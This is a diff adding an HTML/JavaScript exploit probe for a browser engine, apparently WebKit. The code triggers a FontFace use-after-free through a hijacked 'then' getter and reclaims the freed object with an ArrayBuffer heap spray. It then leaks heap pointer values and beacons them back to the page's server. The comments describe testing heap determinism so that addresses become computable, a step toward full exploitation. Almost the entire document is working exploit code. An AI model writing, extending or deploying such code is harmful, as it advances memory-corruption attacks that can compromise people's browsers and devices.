@@ -1,0 +1,147 @@
+<!--
+  p652: Load-1 heap determinism test
+
+  The FontFace lattice law shows T is byte-constant on load-1 (first page load
+  after WebProcess restart). If the ENTIRE heap layout is deterministic on load-1,
+  then ALL addresses are predictable — including our AB's backing store at A.
+
+  This probe:
+  1. Detects if this is load-1 (sessionStorage counter)
+  2. FontFace UAF → records T, W, rc, hit_index
+  3. Full 192B dump (all nonzero dwords)
+  4. Sends everything as beacons
+  5. On reload, repeats — DO NOT navigate away, just reload the page
+     (WebProcess survives reload but sessionStorage tracks load count)
+
+  Run protocol:
+  - Navigate to the page (load-1 after WebProcess restart from crash)
+  - Record results
+  - The page crashes WebProcess (UAF) — next load is load-1 again
+  - Repeat 5+ times
+  - Compare T, W, hit_index across runs
+
+  If T and W are constant → heap is deterministic → A is computable
+  If hit_index is constant → spray order is deterministic → A = spray_base + hit * 192
+
+  CRASH_CLASS: HIGH (FontFace UAF)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p652</title></head>
+<body>p652: load-1 determinism
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+var retained = [];
+
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+  if (bQ.length >= 2) flush();
+}
+function flush() {
+  if (!bQ.length) return;
+  var b = bQ.splice(0, 4).join('|');
+  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P652-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+// Load counter (survives WebProcess restart via sessionStorage)
+var loadN = 1;
+try {
+  var prev = sessionStorage.getItem('p652_n');
+  if (prev) loadN = parseInt(prev, 10) + 1;
+  sessionStorage.setItem('p652_n', String(loadN));
+} catch(e) {}
+
+emit('START', 'load=' + loadN + ' ' + (navigator.userAgent ? navigator.userAgent.slice(0,50) : ''));
+flush();
+
+// ================================================================
+// FontFace UAF
+// ================================================================
+var ff = new FontFace('fd' + loadN, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+document.fonts.add(ff);
+void ff.loaded;
+retained.push(ff);
+
+var sty = document.createElement('style');
+sty.textContent = "@font-face { font-family: sd" + loadN + "; src: local(Arial); unicode-range: U+0042; }";
+document.head.appendChild(sty);
+
+var fired = false;
+var bufs = [];
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (fired) return undefined;
+    fired = true;
+    sty.remove();
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    for (var i = 0; i < 64; i++) {
+      var ab = new ArrayBuffer(192);
+      bufs.push(new Uint8Array(ab));
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+document.fonts.load('1em fd' + loadN + ', sd' + loadN, 'AB');
+
+setTimeout(function() {
+try {
+  var hit = -1;
+  for (var i = 0; i < bufs.length; i++) {
+    var nz = 0;
+    for (var j = 0; j < 192; j++) if (bufs[i][j] !== 0) nz++;
+    if (nz > 0) { hit = i; break; }
+  }
+  if (hit < 0) { emit('MISS', 'no hit load=' + loadN); flush(); return; }
+
+  var dv = new DataView(bufs[hit].buffer);
+  var rc   = dv.getUint32(0x00, true);
+  var T_lo = dv.getUint32(0x58, true);
+  var T_hi = dv.getUint32(0x5C, true);
+  var W_lo = dv.getUint32(0x68, true);
+  var W_hi = dv.getUint32(0x6C, true);
+
+  // The key data line — compact, easy to diff across runs
+  emit('DATA', 'L=' + loadN +
+    ' hit=' + hit +
+    ' rc=' + rc +
+    ' T=' + hex32(T_hi) + hex32(T_lo) +
+    ' W=' + hex32(W_hi) + hex32(W_lo));
+  flush();
+
+  // Full nonzero dump
+  var nzList = [];
+  for (var off = 0; off < 192; off += 4) {
+    var v = dv.getUint32(off, true);
+    if (v !== 0) nzList.push('+' + off.toString(16) + '=' + hex32(v));
+  }
+  emit('NZ', nzList.join(' '));
+  flush();
+
+  // Compute T-W delta (low 32 bits, signed)
+  var tw = ((T_lo - W_lo) | 0);
+  emit('TW', 'T-W=' + tw + ' (0x' + hex32(tw) + ')');
+
+  // After reporting, intentionally crash WebProcess to get a fresh load-1
+  // We do this by triggering a null deref via the UAF'd context
+  // Actually: just let the page sit. The user reloads manually, or
+  // WebProcess crashes from the UAF naturally.
+
+  emit('DONE', 'load=' + loadN + ' — reload page for next sample');
+  flush();
+
+} catch(e) { emit('FATAL', String(e).slice(0,200)); flush(); }
+}, 50);
+})();
+</script>
+</body></html>
